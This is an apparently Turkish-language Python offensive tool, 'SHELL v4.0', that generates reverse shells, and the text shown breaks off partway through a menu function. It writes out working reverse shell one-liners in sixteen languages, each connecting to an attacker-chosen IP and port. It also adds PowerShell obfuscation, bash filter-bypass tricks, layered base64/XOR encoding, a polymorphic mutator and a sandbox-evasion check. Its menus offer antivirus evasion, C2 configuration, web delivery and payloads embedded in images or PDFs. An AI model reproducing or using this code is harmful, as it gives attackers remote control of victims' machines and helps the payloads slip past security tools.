#!/usr/bin/env python3

import sys
import os
import base64
import random
import string
import hashlib
import json
import zlib
import time
import subprocess
from urllib.parse import quote
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import socket
import struct
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler

class ShellGenerator:
    def __init__(self):
        self.version = "4.0"
        self.config = self.yapilandirma_yukle()
        
    def banner_goster(self):
        banner = """
    ╔═════════════════════════╗
    ║          SHELL          ║
    ╚═════════════════════════╝
        """
        print(banner)

    def yardim_goster(self):
        yardim = """
SHELL v4.0 - Reverse Shell Oluşturucu

KULLANIM:
  python3 shell.py                    # Interaktif mod
  python3 shell.py --yardim          # Yardım mesajı
  python3 shell.py --hizli IP PORT   # Hızlı shell oluştur
  python3 shell.py --obfuscate IP PORT TYPE # Obfuscate mod

ÖRNEKLER:
  python3 shell.py --hizli 192.168.1.10 4444
  python3 shell.py --obfuscate 192.168.1.10 4444 powershell
  python3 shell.py --obfuscate 192.168.1.10 4444 bash
        """
        print(yardim)

    def yapilandirma_yukle(self):
        return {
            'sifreleme_anahtari': Fernet.generate_key(),
            'gizleme_seviyesi': 'orta',
            'varsayilan_sablon': 'standart'
        }

    class PowerShellObfuscator:
        def __init__(self):
            self.obfuscation_methods = [
                self.string_reverse,
                self.base64_encode,
                self.hex_encode,
                self.rot13_encode,
                self.insert_junk,
                self.split_strings,
                self.variable_obfuscation
            ]
            
        def string_reverse(self, text):
            return f"[-join('{text}'[{text.length}..0])]"
        
        def base64_encode(self, text):
            encoded = base64.b64encode(text.encode()).decode()
            return f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}'))"
        
        def hex_encode(self, text):
            hex_str = ''.join([f'{ord(c):02x}' for c in text])
            return f"([System.Text.Encoding]::ASCII.GetString([byte[]]('{hex_str}' -split '(..)' -ne '' | %{{[Convert]::ToByte($_,16)}})))"
        
        def rot13_encode(self, text):
            result = []
            for char in text:
                if 'a' <= char <= 'z':
                    result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
                elif 'A' <= char <= 'Z':
                    result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
                else:
                    result.append(char)
            return ''.join(result)
        
        def insert_junk(self, text):
            junk_words = ['#', '/*', '//', '${}', '$()', '@()']
            words = text.split()
            if len(words) > 3:
                insert_pos = random.randint(1, len(words)-2)
                words.insert(insert_pos, random.choice(junk_words))
            return ' '.join(words)
        
        def split_strings(self, text):
            parts = []
            chunk_size = random.randint(3, 8)
            for i in range(0, len(text), chunk_size):
                parts.append(text[i:i+chunk_size])
            return "'" + "'+'".join(parts) + "'"
        
        def variable_obfuscation(self, text):
            var_names = ['$var', '$x', '$a', '$b', '$c', '$d', '$e']
            replacements = {}
            words = text.split()
            
            for i, word in enumerate(words):
                if word.startswith('$') and len(word) > 2:
                    if word not in replacements:
                        replacements[word] = random.choice(var_names) + str(random.randint(100,999))
                    words[i] = replacements[word]
            
            return ' '.join(words)
        
        def obfuscate_powershell(self, code, level=3):
            for _ in range(level):
                method = random.choice(self.obfuscation_methods)
                code = method(code)
            return code

    class LinuxBypassTechniques:
        def __init__(self):
            self.bypass_methods = {
                'ifs': self.ifs_bypass,
                'wildcard': self.wildcard_bypass,
                'brace_expansion': self.brace_expansion,
                'variable_manipulation': self.variable_manipulation,
                'encoding': self.encoding_bypass
            }
        
        def ifs_bypass(self, command):
            bypasses = [
                f"{{{command}}}",
                f"${{{command}}}",
                f"`{command}`",
                f"$({{{command}}})",
                command.replace(' ', '${IFS}'),
                command.replace(' ', '${IFS%?}'),
                command.replace(' ', '${IFS:0:1}'),
                command.replace(' ', '${IFS#}'),
            ]
            return random.choice(bypasses)
        
        def wildcard_bypass(self, command):
            if '/bin' in command:
                return command.replace('/bin', '/???')
            elif 'bash' in command:
                return command.replace('bash', '?a?h')
            return command
        
        def brace_expansion(self, command):
            if 'bash' in command:
                return command.replace('bash', '{b,a,s,h}')
            elif 'sh' in command:
                return command.replace('sh', '{s,h}')
            return command
        
        def variable_manipulation(self, command):
            vars = {
                'b': 'b', 'a': 'a', 's': 's', 'h': 'h',
                's': 's', 'h': 'h'
            }
            
            new_command = command
            for key, value in vars.items():
                if key in new_command:
                    new_command = new_command.replace(key, f'${{{key}}}')
            
            return new_command
        
        def encoding_bypass(self, command):
            encodings = [
                base64.b64encode(command.encode()).decode(),
                command.encode('hex') if hasattr(str, 'encode') else command.encode().hex(),
                ' '.join([str(ord(c)) for c in command])
            ]
            return f"echo {random.choice(encodings)} | decode_command"
        
        def apply_bypass(self, command, technique=None):
            if technique and technique in self.bypass_methods:
                return self.bypass_methods[technique](command)
            else:
                method = random.choice(list(self.bypass_methods.values()))
                return method(command)

    def xor_sifrele(self, veri, anahtar):
        return ''.join(chr(ord(c) ^ ord(anahtar[i % len(anahtar)])) for i, c in enumerate(veri))

    def base64_xor_sifrele(self, veri):
        xor_anahtar = ''.join(random.choices(string.ascii_letters, k=10))
        sifreli = self.xor_sifrele(veri, xor_anahtar)
        return base64.b64encode(f"{xor_anahtar}:{sifreli}".encode()).decode()

    def polimorfik_olustur(self, shell_kodu):
        varyasyonlar = [
            lambda x: x.replace('bash', random.choice(['bash', 'sh', 'shell', '/bin/bash'])),
            lambda x: x.replace('bin', random.choice(['bin', 'usr/bin', ''])),
            lambda x: x + ' # ' + ''.join(random.choices(string.ascii_letters, k=10)),
            lambda x: ' '.join(x.split()),
            lambda x: x.replace('socket', random.choice(['socket', 'sock', 'baglanti'])),
            lambda x: x.replace('exec', random.choice(['exec', 'calistir', 'run'])),
            lambda x: x.replace('system', random.choice(['system', 'sys', 'execute'])),
            lambda x: self.LinuxBypassTechniques().apply_bypass(x),
        ]
        
        for varyasyon in random.sample(varyasyonlar, random.randint(3, 6)):
            shell_kodu = varyasyon(shell_kodu)
            
        return shell_kodu

    def sandbox_atlama_ekle(self, shell_kodu):
        atlama_kodu = """
        if [ $(nproc) -lt 2 ]; then exit; fi
        if [ $(free -m | awk '/^Mem:/{print $2}') -lt 1024 ]; then exit; fi
        if [ $(df / | awk 'NR==2{print $2}') -lt 1000000 ]; then exit; fi
        if [ -f "/proc/self/status" ]; then
            if grep -q "docker\\|lxc" /proc/self/cgroup; then exit; fi
        fi
        sleep $((RANDOM % 3 + 1))
        """
        return atlama_kodu + shell_kodu

    class AIPayloadGenerator:
        def __init__(self):
            self.supheli_patternler = [
                '/bin/sh', 'bash -i', 'socket.socket', 'exec', 'system',
                'Runtime.getRuntime()', 'ProcessBuilder', 'powershell',
                'New-Object', 'IEX', 'Invoke-Expression', 'netcat', 'nc ',
                'socket.connect', 'Base64.decode', 'eval(', 'exec('
            ]
            
        def payload_analiz(self, payload):
            risk_puani = 0
            tespit_edilenler = []
            
            for pattern in self.supheli_patternler:
                count = payload.lower().count(pattern.lower())
                if count > 0:
                    risk_puani += count * 10
                    tespit_edilenler.append(f"{pattern} (x{count})")
            
            if len(payload) > 1000:
                risk_puani += 20
                
            entropi = self.calculate_entropy(payload)
            if entropi > 4.5:
                risk_puani += 30
            
            return {
                'risk_puani': min(risk_puani, 100),
                'tespit_edilenler': tespit_edilenler,
                'oneriler': self.oneri_olustur(risk_puani),
                'entropi': entropi,
                'uzunluk': len(payload)
            }
        
        def calculate_entropy(self, text):
            if not text:
                return 0
            entropy = 0
            for x in range(256):
                p_x = text.count(chr(x)) / len(text)
                if p_x > 0:
                    entropy += - p_x * (p_x.bit_length() - 1)
            return entropy
        
        def oneri_olustur(self, risk_puani):
            if risk_puani < 20:
                return ["Payload temiz görünüyor", "Minimum risk seviyesi"]
            elif risk_puani < 50:
                return ["Temel obfuscation önerilir", "Değişken isimlerini değiştirin", "String'leri encode edin"]
            elif risk_puani < 80:
                return ["İleri obfuscation gerekli", "Polymorphic engine kullanın", "Sandbox atlama ekleyin"]
            else:
                return ["Yüksek risk seviyesi!", "Advanced evasion teknikleri şart", "Manual review önerilir"]
        
        def akilli_gizle(self, payload, risk_seviyesi):
            if risk_seviyesi == "dusuk":
                return base64.b64encode(payload.encode()).decode()
            elif risk_seviyesi == "orta":
                return self.orta_gizleme(payload)
            else:
                return self.agir_gizleme(payload)
        
        def orta_gizleme(self, payload):
            parcalar = [payload[i:i+8] for i in range(0, len(payload), 8)]
            kodlanmis_parcalar = [base64.b64encode(parca.encode()).decode() for parca in parcalar]
            return f"eval(''.join([__import__('base64').b64decode(p).decode() for p in '{'|'.join(kodlanmis_parcalar)}'.split('|')]))"
        
        def agir_gizleme(self, payload):
            layer1 = base64.b64encode(payload.encode()).decode()
            layer2 = layer1[::-1]
            layer3 = base64.b64encode(layer2.encode()).decode()
            
            return f"""
import base64
exec(base64.b64decode('{layer3}'[::-1]).decode())
            """.strip()

    def temel_shell_olustur(self, secim, ip, port, secenekler):
        shell_listesi = {
            1: f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            2: f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
            3: f"nc -e /bin/sh {ip} {port}",
            4: f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            5: f"powershell -nop -c \"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            6: f"socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
            7: f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
            8: f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            9: f"go run -c 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'",
            10: f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(1) {{do{{printf \"shell>\" |& s; s |& getline c; if(c){{while ((c |& getline) > 0) print $0 |& s; close(c)}}}} while(c != \"exit\") close(s)}}}}'",
            11: f"telnet {ip} {port} | /bin/sh | telnet {ip} {port}",
            12: f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            13: f"node -e \"const {{ spawn }} = require('child_process'); const client = require('net').connect({port}, '{ip}', () => {{ const sh = spawn('/bin/sh', []); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }});\"",
            14: f"openssl s_client -quiet -connect {ip}:{port}",
            15: f"dart -e 'import \"dart:io\";main(){{Socket.connect(\"{ip}\",{port}).then((s){{Process.start(\"/bin/sh\",[]).then((p){{s.listen(p.stdin.add);p.stdout.listen(s.add);p.stderr.listen(s.add);}});}});}}'",
            16: f"groovy -e 'import java.net.*; import java.io.*; Socket s=new Socket(\"{ip}\",{port}); Process p=new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start(); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){{ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); }} s.close();'"
        }
        
        return shell_listesi.get(secim, "Geçersiz shell türü")

    def obfuscate_powershell_shell(self, ip, port, obfuscation_level=3):
        ps_shell = f"""
$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
        """.strip()
        
        obfuscator = self.PowerShellObfuscator()
        return obfuscator.obfuscate_powershell(ps_shell, obfuscation_level)

    def obfuscate_linux_shell(self, ip, port, shell_type=1):
        temel_shell = self.temel_shell_olustur(shell_type, ip, port, {})
        bypass = self.LinuxBypassTechniques()
        
        obfuscated = bypass.apply_bypass(temel_shell, 'ifs')
        obfuscated = bypass.apply_bypass(obfuscated, 'wildcard')
        obfuscated = bypass.apply_bypass(obfuscated, 'brace_expansion')
        
        if random.choice([True, False]):
            b64_encoded = base64.b64encode(obfuscated.encode()).decode()
            obfuscated = f"echo {b64_encoded} | base64 -d | bash"
        
        return obfuscated

    def gelismis_shell_olustur(self, secim, ip, port, secenekler):
        obfuscate = secenekler.get('obfuscate', False)
        obfuscation_level = secenekler.get('obfuscation_level', 3)
        
        if obfuscate:
            if secim == 5:
                return self.obfuscate_powershell_shell(ip, port, obfuscation_level)
            else:
                return self.obfuscate_linux_shell(ip, port, secim)
        else:
            temel_shell = self.temel_shell_olustur(secim, ip, port, secenekler)
            
            ai_motoru = self.AIPayloadGenerator()
            analiz = ai_motoru.payload_analiz(temel_shell)
            
            print(f"[AI Analiz] Risk Puanı: {analiz['risk_puani']}/100")
            print(f"Tespit Edilenler: {', '.join(analiz['tespit_edilenler'][:3])}")
            print(f"Öneriler: {analiz['oneriler'][0]}")
            
            gizleme = secenekler.get('gizleme', 'orta')
            
            if gizleme == 'dusuk':
                return temel_shell
            elif gizleme == 'orta':
                return ai_motoru.orta_gizleme(temel_shell)
            elif gizleme == 'yuksek':
                return self.polimorfik_olustur(temel_shell)
            elif gizleme == 'agir':
                return self.sandbox_atlama_ekle(
                    self.polimorfik_olustur(
                        ai_motoru.agir_gizleme(temel_shell)
                    )
                )

    def hizli_olustur(self, ip, port):
        print(f"\n[+] Hızlı Shell Oluşturma: {ip}:{port}")
        secenekler = {'gizleme': 'orta'}
        
        print("\n[1] Python Shell:")
        py_shell = self.gelismis_shell_olustur(2, ip, port, secenekler)
        print(py_shell)
        
        print("\n[2] PowerShell (Obfuscated):")
        ps_shell = self.obfuscate_powershell_shell(ip, port)
        print(ps_shell)
        
        print("\n[3] Bash (IFS Bypass):")
        bash_shell = self.obfuscate_linux_shell(ip, port, 1)
        print(bash_shell)
        
        if input("\n[?] Dosyaya kaydet? (e/H): ").lower() == 'e':
            timestamp = int(time.time())
            with open(f"shell_{ip}_{port}_{timestamp}.py", 'w') as f:
                f.write(f"# Python Shell\n{py_shell}\n\n")
                f.write(f"# PowerShell\n{ps_shell}\n\n")
                f.write(f"# Bash Shell\n{bash_shell}")
            print(f"[+] shell_{ip}_{port}_{timestamp}.py kaydedildi")

    def obfuscate_mod(self, ip, port, shell_type):
        print(f"\n[+] Obfuscation Modu: {shell_type.upper()}")
        
        if shell_type.lower() == 'powershell':
            for level in [1, 2, 3]:
                print(f"\n[Level {level}] PowerShell Obfuscated:")
                obfuscated = self.obfuscate_powershell_shell(ip, port, level)
                print(obfuscated)
                
                ai = self.AIPayloadGenerator()
                analiz = ai.payload_analiz(obfuscated)
                print(f"   Risk: {analiz['risk_puani']}/100, Entropi: {analiz['entropi']:.2f}")
                
        elif shell_type.lower() == 'bash':
            print("\n[IFS Bypass Techniques]:")
            bypass = self.LinuxBypassTechniques()
            original = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            
            techniques = ['ifs', 'wildcard', 'brace_expansion', 'variable_manipulation']
            for tech in techniques:
                obfuscated = bypass.apply_bypass(original, tech)
                print(f"\n[{tech.upper()}] {obfuscated}")
                
        else:
            print("Desteklenen türler: powershell, bash")

    def ana_menu(self):
        print("\n" + "="*60)
        print("SHELL v4.0 - ANA MENÜ")
        print("="*60)
        print("1. Standart Shell Oluşturma")
        print("2. AV Atlama Modu")
        print("3. AI Destekli Payload'lar") 
        print("4. PowerShell Obfuscation")
        print("5. Linux Bypass Teknikleri")
        print("6. Cloud Entegrasyonu")
        print("7. Mobile Payload'lar")
        print("8. Protokol Kötüye Kullanımı")
        print("9. C2 Framework Entegrasyonu")
        print("10. Web Delivery Şablonları")
        print("11. Toplu Oluşturma")
        print("12. Payload Analizi")
        print("13. Gömülü Payload'lar")
        print("14. Çoklu Atlama")
        print("15. Çıkış")
        
        try:
            secim = int(input("\n[?] Seçim yapın (1-15): "))
            return secim
        except ValueError:
            print("[!] Geçersiz giriş!")
            return 15

    def powershell_obfuscation_menu(self):
        print("\n=== POWEROBFUSCATION ENGINE ===")
        ip = input("[?] Dinleyici IP: ")
        port = input("[?] Dinleyici Port: ")
        
        print("\n[1] Temel Obfuscation")
        print("[2] Orta Obfuscation") 
        print("[3] İleri Obfuscation")
        print("[4] Tüm Seviyeler")
        
        try:
            level_choice = int(input("[?] Seviye seçin (1-4): "))
            levels = {1: 1, 2: 2, 3: 3, 4: [1,2,3]}
            
            if level_choice == 4:
                for lvl in [1,2,3]:
                    print(f"\n[Level {lvl}]:")
                    print(self.obfuscate_powershell_shell(ip, port, lvl))
            else:
                result = self.obfuscate_powershell_shell(ip, port, levels[level_choice])
                print(f"\nObfuscated PowerShell:\n{result}")
                
        except Exception as e:
            print(f"[!] Hata: {e}")

    def linux_bypass_menu(self):
        print("\n=== LINUX BYPASS TEKNİKLERİ ===")
        ip = input("[?] Dinleyici IP: ")
        port = input("[?] Dinleyici Port: ")
        
        print("\nBypass Teknikleri:")
        print("1. IFS Bypass")
        print("2. Wildcard Bypass")
        print("3. Brace Expansion")
        print("4. Variable Manipulation")
        print("5. Tüm Teknikler")
        
        try:
            tech_choice = int(input("[?] Teknik seçin (1-5): "))
            bypass = self.LinuxBypassTechniques()
            original = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            
            techniques = ['ifs', 'wildcard', 'brace_expansion', 'variable_manipulation']
            
            if tech_choice == 5:
                for i, tech in enumerate(techniques, 1):
                    result = bypass.apply_bypass(original, tech)
                    print(f"\n[{i}] {tech.upper()}: {result}")
            else:
                tech_name = techniques[tech_choice-1]
                result = bypass.apply_bypass(original, tech_name)
                print(f"\n{tech_name.upper()} Bypass: {result}")
                
        except Exception as e:
            print(f"[!] Hata: {e}")

    def calistir(self):
        if len(sys.argv) > 1:
            if sys.argv[1] in ["--yardim", "-y", "--help", "-h"]:
                self.yardim_goster()
                return
            elif sys.argv[1] == "--hizli" and len(sys.argv) == 4:
                ip = sys.argv[2]
                port = sys.argv[3]
                self.hizli_olustur(ip, port)
                return
            elif sys.argv[1] == "--obfuscate" and len(sys.argv) == 5:
                ip = sys.argv[2]
                port = sys.argv[3]
                shell_type = sys.argv[4]
                self.obfuscate_mod(ip, port, shell_type)
                return
        
        self.banner_goster()
        
        while True:
            secim = self.ana_menu()
            
            if secim == 1:
                self.standart_olusturma()
            elif secim == 2:
                self.av_atlama_modu()
            elif secim == 3:
                self.ai_destekli_mod()
            elif secim == 4:
                self.powershell_obfuscation_menu()
            elif secim == 5:
                self.linux_bypass_menu()
            elif secim == 6:
                self.cloud_entegrasyon()
            elif secim == 7:
                self.mobile_payloadlar()
            elif secim == 8:
                self.protokol_kullanimi()
            elif secim == 9:
                self.c2_entegrasyon()
            elif secim == 10:
                self.web_delivery()
            elif secim == 11:
                self.toplu_olusturma_menu()
            elif secim == 12:
                self.payload_analiz_menu()
            elif secim == 13:
                self.gomulu_payloadlar()
            elif secim == 14:
                self.pivot_menu()
            elif secim == 15:
                print("[+] Güle güle!")
                break
            else:
                print("[!] Geçersiz seçim!")

    def standart_olusturma(self):
        print("\n=== STANDART SHELL OLUŞTURMA ===")
        ip = input("[?] Dinleyici IP: ")
        port = input("[?] Dinleyici Port: ")
        
        print("\nShell Türleri:")
        shell_turleri = {
            1: "Bash", 2: "Python", 3: "Netcat", 4: "PHP", 5: "PowerShell",
            6: "Socat", 7: "Ruby", 8: "Perl", 9: "Golang", 10: "AWK",
            11: "Telnet", 12: "Lua", 13: "Node.js", 14: "OpenSSL",
            15: "Dart", 16: "Groovy"
        }
        
        for num, isim in shell_turleri.items():
            print(f"{num}. {isim}")
        
        try:
            shell_secim = int(input("\n[?] Shell türü seçin (1-16): "))
            secenekler = {'gizleme': 'dusuk'}
            payload = self.gelismis_shell_olustur(shell_secim, ip, port, secenekler)
            
            print(f"\n[+] Oluşturulan Payload:\n{payload}")
            
            if input("\n[?] Dosyaya kaydet? (e/H): ").lower() == 'e':
                dosya_adi = input("[?] Dosya adı: ")
                with open(dosya_adi, 'w') as f:
                    f.write(payload)
                print(f"[+] {dosya_adi} dosyasına kaydedildi")
                
        except Exception as e:
            print(f"[!] Hata: {e}")

    def av_atlama_modu(self):
        print("\n=== AV ATLAMA MODU ===")
        ip = input("[?] Dinleyici IP: ")
        port = input("[?] Dinleyici Port: ")
        
        print("\nAtlama Teknikleri:")
        print("1. Temel Gizleme")
        print("2. Polimorfik Motor")
        print("3. Sandbox Atlama")
        print("4. Tam Gizlilik Modu")
        
        try:
            atlama_secim = int(input("[?] Teknik seçin (1-4): "))
            teknikler = {1: 'dusuk', 2: 'yuksek', 3: 'orta', 4: 'agir'}
            secenekler = {'gizleme': teknikler.get(atlama_secim, 'orta')}
            
            payload = self.gelismis_shell_olustur(2, ip, port, secenekler)
            print(f"\n[+] Atlama Payload:\n{payload}")
            
        except Exception as e:
            print(f"[!] Hata: {e}")

    def ai_destekli_mod(self):
        print("\n=== AI DESTEKLİ PAYLOAD'LAR ===")
        ip = input("[?] Dinleyici IP: ")
        port = input("[?] Dinleyici Port: ")
        
        ai_motoru = self.AIPayloadGenerator()
        temel_payload = self.temel_shell_olustur(2, ip, port, {})
        
        print("\n[AI Analiz Sonuçları]:")
        analiz = ai_motoru.payload_analiz(temel_payload)
        for anahtar, deger in analiz.items():
            print(f"{anahtar}: {deger}")
        
        akilli_payload = ai_motoru.akilli_gizle(temel_payload, "yuksek")
        print(f"\n[AI Optimize Payload]:\n{akilli_payload}")

    def cloud_entegrasyon(self):
        print("\n=== CLOUD ENTEGRASYONU ===")
        ip = input("[?] Dinleyici IP: ")
        port = input("[?] Dinleyici Port: ")
        
        cloud = self.CloudEntegrasyon()
        
        print("\nCloud Platformları:")
        print("1. AWS Lambda")
        print("2. Azure Functions")
        print("3. Google Cloud")
        
        try:
            cloud_secim = int(input("[?] Platform seçin (1-3): "))
            if cloud_secim == 1:
                payload = cloud.aws_lambda_backdoor(ip, port)
            elif cloud_secim == 2:
                payload = cloud.azure_fonksiyon_shell(ip, port)
            elif cloud_secim == 3:
                payload = cloud.google_cloud_shell(ip, port)
            else:
                payload = "Geçersiz seçim"
            
            print(f"\n[Cloud Payload]:\n{payload}")
            
        except Exception as e:
            print(f"[!] Hata: {e}")

    def mobile_payloadlar(self):
        print("\n=== MOBILE PAYLOAD'LAR ===")
        ip = input("[?] Dinleyici IP: ")
        port = input("[?] Dinleyici Port: ")
        
        mobile = self.MobilePayloadlar()
        
        print("\nMobil Platformlar:")
        print("1. Android")
        print("2. iOS")
        
        try:
            mobile_secim = int(input("[?] Platform seçin (1-2): "))
            if mobile_secim == 1:
                payload = mobile.android_shell(ip, port)
            elif mobile_secim == 2:
                payload = mobile.ios_shell(ip, port)
            else:
                payload = "Geçersiz seçim"
            
            print(f"\n[Mobil Payload]:\n{payload}")
            
        except Exception as e:
            print(f"[!] Hata: {e}")

    def protokol_kullanimi(self):
        print("\n=== PROTOKOL KÖTÜYE KULLANIMI ===")
        ip = input("[?] Hedef IP/Domain: ")
        port = input("[?] Port: ")
        
        protokol = self.ProtokolKullanimi()
        
        print("\nProtokoller:")
        print("1. DNS Tunneling")
        print("2. HTTP Web Shell")
        print("3. SMB Shell")
        
        try:
            proto_secim = int(input("[?] Protokol seçin (1-3): "))
            if proto_secim == 1:
                payload = protokol.dns_tunnel(ip, port)
            elif proto_secim == 2:
                payload = protokol.http_webshell(ip, port)
            elif proto_secim == 3:
                paylasim = input("[?] Paylaşım adı: ")
                payload = protokol.smb_shell(ip, paylasim)
            else:
                payload = "Geçersiz seçim"
            
            print(f"\n[Protokol Payload]:\n{payload}")
            
        except Exception as e:
            print(f"[!] Hata: {e}")

    def c2_entegrasyon(self):
        print("\n=== C2 FRAMEWORK ENTEGRASYONU ===")
        ip = input("[?] C2 Sunucu IP: ")
        port = input("[?] C2 Sunucu Port: ")
        
        c2 = self.C2Entegrasyon()
        
        print("\nC2 Framework'leri:")
        for i, framework in enumerate(c2.desteklenen_c2, 1):
            print(f"{i}. {framework}")
        
        try:
            c2_secim = int(input("[?] Framework seçin (1-3): "))
            frameworkler = ['metasploit', 'cobalt_strike', 'sliver']
            secilen_framework = frameworkler[c2_secim-1] if 1 <= c2_secim <= 3 else 'metasploit'
            
            if secilen_framework == 'metasploit':
                payload = c2.metasploit_olustur(ip, port)
            elif secilen_framework == 'cobalt_strike':
                payload = c2.cobalt_strike_olustur(ip, port)
            elif secilen_framework == 'sliver':
                payload = c2.sliver_olustur(ip, port)
            else:
                payload = f"{secilen_framework} konfigürasyonu"
            
            print(f"\n[C2 Konfigürasyonu]:\n{payload}")
            
        except Exception as e:
            print(f"[!] Hata: {e}")

    def web_delivery(self):
        print("\n=== WEB DELIVERY ŞABLONLARI ===")
        ip = input("[?] IP Adresiniz: ")
        port = input("[?] Web Sunucu Port: ")
        
        print("\nDelivery Methodları:")
        print("1. Python")
        print("2. PowerShell")
        print("3. cURL + Bash")
        print("4. wget + Bash")
        
        try:
            method_secim = int(input("[?] Method seçin (1-4): "))
            methodlar = ['python', 'powershell', 'curl_bash', 'wget_bash']
            secilen_method = methodlar[method_secim-1] if 1 <= method_secim <= 4 else 'python'
            
            payload = self.web_delivery_olustur(ip, port, secilen_method)
            print(f"\n[Web Delivery Payload]:\n{payload}")
            
            if input("\n[?] Web sunucusu başlatılsın mı? (e/H): ").lower() == 'e':
                self.web_sunucu_baslat(int(port))
                print(f"[+] Web sunucusu http://{ip}:{port} adresinde başlatıldı")
                print("[+] Shell dosyanızı /tmp/ dizinine yerleştirin")
                
        except Exception as e:
            print(f"[!] Hata: {e}")

    def toplu_olusturma_menu(self):
        print("\n=== TOPLU OLUŞTURMA ===")
        ip = input("[?] Dinleyici IP: ")
        port = input("[?] Dinleyici Port: ")
        
        print("\nShell türlerini seçin (virgülle ayırın):")
        print("1:Bash, 2:Python, 3:Netcat, 4:PHP, 5:PowerShell, 6:Socat, 7:Ruby, 8:Perl")
        
        try:
            secimler = input("[?] Shell türleri (örn: 1,2,3): ").split(',')
            shell_turleri = [int(x.strip()) for x in secimler]
            
            secenekler = {'gizleme': 'orta'}
            sonuclar = self.toplu_olustur(ip, port, shell_turleri, secenekler)
            
            print("\n[Toplu Oluşturma Sonuçları]:")
            for shell_turu, payload in sonuclar.items():
                print(f"\n{shell_turu}: {payload}")
                
            if input("\n[?] Tümünü dosyaya kaydet? (e/H): ").lower() == 'e':
                for shell_turu, payload in sonuclar.items():
                    dosya_adi = f"shell_{shell_turu}.txt"
                    with open(dosya_adi, 'w') as f:
                        f.write(payload)
                    print(f"[+] {dosya_adi} kaydedildi")
                    
        except Exception as e:
            print(f"[!] Hata: {e}")

    def payload_analiz_menu(self):
        print("\n=== PAYLOAD ANALİZİ ===")
        payload = input("[?] Payload'ı yapıştırın: ")
        
        analiz = self.payload_analiz(payload)
        
        print("\n[Analiz Sonuçları]:")
        for anahtar, deger in analiz.items():
            print(f"{anahtar}: {deger}")

    def gomulu_payloadlar(self):
        print("\n=== GÖMÜLÜ PAYLOAD'LAR ===")
        ip = input("[?] Dinleyici IP: ")
        port = input("[?] Dinleyici Port: ")
        
        shell_kodu = self.temel_shell_olustur(2, ip, port, {})
        
        print("\nGömme Seçenekleri:")
        print("1. Resim Dosyası")
        print("2. PDF Belgesi")
        
        try:
            gomme_secim = int(input("[?] Seçenek seçin (1-2): "))
            dosya_turleri = ['resim', 'pdf']
            secilen_tur = dosya_turleri[gomme_secim-1] if 1 <= gomme_secim <= 2 else 'resim'
            
            cikti_dosyasi = input("[?] Çıktı dosya adı: ")
            sonuc = self.gomulu_payload_olustur(secilen_tur, shell_kodu, cikti_dosyasi)
            
            print(f"\n[Gömme Sonucu]:\n{sonuc}")
            
        except Exception as e:
            print(f"[!] Hata: {e}")

    def pivot_menu(self):
        print("\n=== ÇOKLU ATLAMA ===")
        pivot = self.PivotYonetici()
        
        print("\nAtlama Methodları:")
        print("1. SSH Tunnel")
        print("2. SOCKS Proxy")
        
        try:
            pivot_secim = int(input("[?] Method seçin (1-2): "))
            
            if pivot_secim == 1:
                atlama_makinesi = input("[?] Atlama makinesi: ")
                hedef_ip = input("[?] Hedef IP: ")
                hedef_port = input("[?] Hedef port: ")
                yerel_port = input("[?] Yerel port (varsayılan 1080): ") or "1080"
                
                config = pivot.ssh_tunnel_olustur(atlama_makinesi, hedef_ip, hedef_port, yerel_port)
            elif pivot_secim == 2:
                atlama_makinesi = input("[?] Atlama makinesi: ")
